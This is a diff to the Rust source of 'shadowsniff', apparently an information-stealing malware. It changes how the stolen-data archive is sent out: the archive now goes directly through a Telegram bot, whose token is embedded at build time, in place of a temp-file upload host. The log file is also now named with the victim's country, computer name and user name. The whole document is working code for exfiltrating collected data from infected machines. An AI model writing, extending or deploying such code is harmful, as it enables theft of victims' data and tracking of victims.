@@ -16,11 +16,10 @@ use core::ops::Deref;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::init_ip_info;
+use ipinfo::{init_ip_info, unwrapped_ip_info, IpInfo};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use sender::telegram_bot::TelegramBotSender;
-use sender::tmpfiles::TmpFilesUploader;
 use sender::LogSenderExt;
 use shadowsniff::SniffTask;
 use tasks::Task;
@@ -83,12 +82,14 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
         Arc::from(env!("TELEGRAM_BOT_TOKEN")),
     );
 
-    let _ = TmpFilesUploader::new(telegram).send_archive(generate_log_name(), zip, &collector);
+    let _ = telegram.send_archive(generate_log_name(), zip, &collector);
 
     0
 }
 
 fn generate_log_name() -> Arc<str> {
     let PcInfo { computer_name, user_name, .. } = PcInfo::retrieve();
-    format!("{computer_name}-{user_name}.shadowsniff.zip").into()
+    let IpInfo { country, .. } = unwrapped_ip_info();
+
+    format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
 }
